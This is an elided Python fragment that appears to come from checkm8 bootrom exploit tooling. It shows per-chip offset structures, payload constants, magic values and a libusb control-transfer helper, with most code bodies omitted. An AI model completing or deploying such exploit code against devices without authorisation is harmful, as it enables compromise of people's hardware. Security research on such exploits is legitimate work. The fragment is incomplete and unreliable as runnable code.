...
class ConstantsUSB:
    ...
    def __len__(self):
        return len(ConstantsUSB.__slots__)

    def __getitem__(self, item: int):
        return self.__getattribute__(list(ConstantsUSB.__slots__)[item])


@dataclasses.dataclass
class OffsetsCheckm8:
    descriptors: int
    serial_number: int
    create_string_descriptor: int
    serial_number_descriptor: int
    payload_test: int
    payload_offset: int
    payload_size: int
    payload_pointer: int
...
def libusb1_async_ctrl_transfer(
    ...
    request = array.array(
        "B",
        struct.pack("<BBHHH", bmRequestType, bRequest, wValue, wIndex, len(data))
        + data,
    )
...
def payload(cpid):
    ...
    if cpid == 0x8002:
        ...
        constants_checkm8_t8002 = OffsetsCheckm8(
    ...
    if cpid == 0x8004:
        ...
        constants_checkm8_t8004 = OffsetsCheckm8(
    ...
    if cpid == 0x8010:
        constants_usb_t8010 = ConstantsUSB(
        ...
        constants_checkm8_t8010 = OffsetsCheckm8(
    ...
    if cpid == 0x8011:
        constants_usb_t8011 = ConstantsUSB(
            0x1800B0000,  # 1 - LOAD_ADDRESS
            0x6578656365786563,  # 2 - EXEC_MAGIC
            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
        ...
        constants_checkm8_t8011 = OffsetsCheckm8(
    ...
    if cpid == 0x8012:
        ...
        constants_checkm8_t8012 = OffsetsCheckm8(
    ...
    if cpid == 0x8015:
        constants_usb_t8015 = ConstantsUSB(
            0x18001C000,  # 1 - LOAD_ADDRESS
            0x6578656365786563,  # 2 - EXEC_MAGIC
            0x646F6E65646F6E65,  # 3 - DONE_MAGIC
            0x6D656D636D656D63,  # 4 - MEMC_MAGIC
        ...
        constants_checkm8_t8015 = OffsetsCheckm8(
